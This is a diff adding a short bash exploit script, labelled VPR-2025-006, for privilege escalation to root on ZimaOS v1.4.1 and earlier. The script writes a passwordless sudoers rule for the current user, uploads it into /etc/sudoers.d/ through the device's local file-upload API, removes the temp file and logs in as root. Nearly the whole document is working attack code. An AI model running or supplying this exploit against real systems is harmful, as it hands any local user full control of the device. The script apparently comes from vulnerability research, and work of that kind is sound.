@@ -1,0 +1,17 @@
+#!/usr/bin/env bash
+
+# Exploit:          VPR-2025-006
+# Affects:          ZimaOS <= v1.4.1
+# Purpose:          Privilege Escalation
+# Description:      Privilege Escalation to root from ANY user.
+
+# Created by:       VPR
+# Created:          June 15th, 2025
+
+# Updated by:       VPR
+# Updated:          June 15th, 2025
+
+echo ${USER} "ALL=(ALL) NOPASSWD: ALL" > /tmp/priv_esc_111
+curl "http://127.0.0.1/v2_1/files/file/uploadV2" -F "path=/etc/sudoers.d/" -F "file=@/tmp/priv_esc_111"
+rm /tmp/priv_esc_111
+sudo login root
